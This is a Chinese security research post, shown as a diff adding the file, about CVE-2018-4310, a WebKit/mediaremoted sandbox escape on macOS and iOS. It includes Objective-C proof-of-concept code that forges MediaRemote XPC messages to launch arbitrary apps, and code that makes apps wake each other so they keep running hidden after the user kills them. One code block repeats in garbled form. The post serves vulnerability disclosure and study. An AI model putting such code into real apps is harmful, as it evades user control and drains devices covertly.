@@ -1,0 +1,90 @@
+**作者： 0xcc  
+原文链接：**
+在 2018 年我给 iOS 和 macOS 报了一个 WebKit 沙箱逃逸漏洞 CVE-2018-4310。在报告里还提到了它在 iOS
+上有一个奇特的用途，就是做一个永远杀不死的 App。
+苹果当时应该是没有看懂，只在 macOS 上修复了沙箱逃逸。等我 2019 年在首尔的 TyphoonCon
+上介绍了一遍案例[1]之后，终于被低调混入现场的甲方看到了，在之后的 iOS 中彻底修复了这个问题。
+本文就来介绍一下这个漏洞，以及在当时是如何打造一个杀不死的 App。
+首先这个 WebKit 的沙箱逃逸漏洞几乎是捡来的。
+大家可能有过这样的体验，在误触 MacBook 键盘上方的媒体键之后，iTunes 播放器弹了出来。Google 一下发现很多人都想关掉这个功能。
+经过逆向发现这个快捷键是一个叫 rcd 的进程处理的。
+会触发如下的调用链：
+    * thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
+    frame #0: 0x00007fff6a932420 MediaRemote`MRMediaRemoteSendCommandToApp
+    MediaRemote`MRMediaRemoteSendCommandToApp:
+    -> 0x7fff6a932420 : push rbp
+       0x7fff6a932421 : mov rbp, rsp
+       0x7fff6a932424 : sub rsp, 0x70
+       0x7fff6a932428 : mov rax, qword ptr [rbp + 0x10]
+    Target 0: (rcd) stopped.
+    (lldb) bt
+    * thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
+     * frame #0: 0x00007fff6a932420 MediaRemote`MRMediaRemoteSendCommandToApp
+       frame #1: 0x000000010d73829a rcd`HandleMediaRemoteCommand + 260
+       frame #2: 0x000000010d7387ff rcd`HandleHIDEvent + 736
+HandleHIDEvent -> HandleMediaRemoteCommand -> MRMediaRemoteSendCommandToApp
+而这个 MediaRemote 框架的函数向系统服务 com.apple.mediaremoted，也就是 mediaremoted 进程发送 XPC
+消息。在 mac 和 iOS 上都有一个全局的播放器控制界面，背后就是 mediaremoted 处理的。
+XPC 消息的格式是一个字典。其中 MRXPC_MESSAGE_ID_KEY 对应一个 uint64 值，用来表示这条消息具体由 mediaremoted
+当中的哪个函数响应，相当于类型信息。
+触发弹出 iTunes 播放器的消息包含一个叫 MRXPC_NOWPLAYING_PLAYER_PATH_DATA_KEY 的键，内容是序列化成二进制
+buffer 的 MRNowPlayingPlayerPathProtobuf 类。
+这个类有三个关键的字段：origin、client 和 player。键 client 指向一个 _MRNowPlayingClientProtobuf
+对象，这个对象当中包含一个字符串，也就是播放器的 bundle id。最后 mediaremoted 会根据 bundle id 找到对应的应用程序，调用
+MSVLaunchApplication 运行。
+默认情况下，按下媒体键后发送的消息，bundle id 是系统默认的播放器，如果没有安装其他的，默认就是 iTunes。
+那如果我们伪造一个 XPC 消息，把 bundle id 换成其他应用，比如 Xcode 或者计算器会怎么样？
+    extern id MRNowPlayingClientCreate(NSNumber *, NSString *);
+    extern id MRMediaRemoteSendCommandToClient(int, NSDictionary *, id, id, int, int, id);
+    id client = MRNowPlayingClientCreate(nil, @"com.apple.calculator");
+    NSDictionary *args = @{@"kMRMediaRemoteOptionDisableImplicitAppLaunchBehaviors" : @NO};
+    MRMediaRemoteSendCommandToClient(2, args, nil, client, 1, 0, nil);
+    // make sure the process doesn't quit before mediaremoted's answer
+这段代码里使用了 MediaRemote 的私有函数来构造和发送 XPC 消息。比如传入 com.apple.calculator，真的运行了计算器。
+macOS 端的沙箱配置文件是以源码形式发布的。在 WebKit（Safari）渲染器的沙箱配置当中可以看到允许访问 mediaremoted 服务：
+    (allow mach-lookup
+     (global-name "com.apple.mediaremoted.xpc")
+使用 lldb 把我们的测试代码注入 WebKit 的渲染器进程，果然弹出了计算器：
+当然这个漏洞在实战中需要其他漏洞组合，否则几乎无用。这种方式虽然可以在浏览器沙箱外启动任意程序，但需要目标程序预先在 LaunchService
+当中注册过，例如从 AppStore 当中下载回来的应用等。
+笔者找到了另一个 HIService 的问题，结合远程 NFS 挂载可能构造出这样的条件[2]。本文重点在如何创建一个杀不掉的 iOS
+App，这里就不展开讲了。
+通常在 iOS 上，第三方 App 做应用间跳时只允许使用 Universal Link (URL Scheme) 的形式。这个 mediaremoted
+启动任意 App 的问题正好在当时的 iOS 上存在，使得原本没有对第三方开放的计算器应用能被运行起来。
+当然直到现在计算器也只能通过捷径启动，第三方 App 无法主动打开。
+通过这种机制启动的应用不会在前台显示界面，除非 App 响应了对应的事件：AppDelegate 的
+-remoteControlReceivedWithEvent:。
+在 iOS 上有后台播放机制。如果注册了对应的系统广播事件，以及设置了特定的 Info.plist，就可以在播放音频时进入后台而不会被冻结。我发现
+MediaRemote 的这个问题居然还有延长 App 后台时间的副作用（妙用），一次可以 _续 30 秒_ ，而同时又不会占用全局的播放器。
+那么每隔 10 秒让 mediaremoted 给我们增加后台时间，就可以一直运行下去。
+    - (BOOL)application:(UIApplication *)application didFinishLaunchingWithOptions:(
+    - (BOOL)application:(UIApplication *)application didFinishLaunchingWithOptions:(NSDictionary *)launchOptions {
+       [application beginReceivingRemoteControlEvents]; // register to RemoteControl
+       wake([[NSBundle mainBundle] bundleIdentifier]); // 30 more seconds for background
+       return YES;
+    }
+    void wake(NSString *bundle) {
+       id client = MRNowPlayingClientCreate(nil, bundle);
+       NSDictionary *args = @{@"kMRMediaRemoteOptionDisableImplicitAppLaunchBehaviors": @0};
+       dispatch_semaphore_t semaphore = dispatch_semaphore_create(0);
+       MRMediaRemoteSendCommandToClient(2, args, nil, client, 1, 0, nil);
+    }
+    // this callback will be triggered by MediaRemote
+    -(void)remoteControlReceivedWithEvent:(UIEvent *)event {
+       dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 10 * NSEC_PER_SEC), dispatch_get_main_queue(), ^{
+           wake([[NSBundle mainBundle] bundleIdentifier]); // or other app bundle
+       }); // renewal after 10 seconds
+    }NSDictionary *)launchOptions {   [application beginReceivingRemoteControlEvents]; // register to RemoteControl   wake([[NSBundle mainBundle] bundleIdentifier]); // 30 more seconds for background   return YES;}void wake(NSString *bundle) {   id client = MRNowPlayingClientCreate(nil, bundle);   NSDictionary *args = @{@"kMRMediaRemoteOptionDisableImplicitAppLaunchBehaviors": @0};   dispatch_semaphore_t semaphore = dispatch_semaphore_create(0);   MRMediaRemoteSendCommandToClient(2, args, nil, client, 1, 0, nil);}// this callback will be triggered by MediaRemote-(void)remoteControlReceivedWithEvent:(UIEvent *)event {   dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 10 * NSEC_PER_SEC), dispatch_get_main_queue(), ^{       wake([[NSBundle mainBundle] bundleIdentifier]); // or other app bundle   }); // renewal after 10 seconds}
+但即使是音乐播放器，还是会被向上滑动的手势杀死。
+考虑一种常见的情况。
+假设安装了至少两个来自同一开发者的应用：“金刚狗”和“活侍”。只要有两个不同的 App
+同时使用了这个技巧，在运行期间互相唤醒，就可以创建出一个和用户手势的竞争条件，变成两个杀不死的 App。试问用户的手速如何赶上代码执行的速度？
+这个视频展示了 12.0.1 上的效果:
+只要启动任意一个 App，就可以在后台唤醒全家桶。全家桶之间进一步互相唤醒，即使用户手动“杀死”了进程，在前台看不到任何 App
+运行的迹象，任务列表也是空的。实际上 Wade 和 Logan 在后台运行得正欢，分秒必争地燃烧着你的电池。
+视频详见原文链接：
+这个问题在 iOS 13 之前早已修复。本文仅作技术探讨，分析一种开发者作恶的情况。 **请不要将这种小动作带到生产环境。**
+参考阅读:
+  1.  I Want to Break Free - Unusual Logic Safari Sandbox Escape
+  2.  Revisiting an old MediaRemote bug (CVE-2018-4340)
+* * *
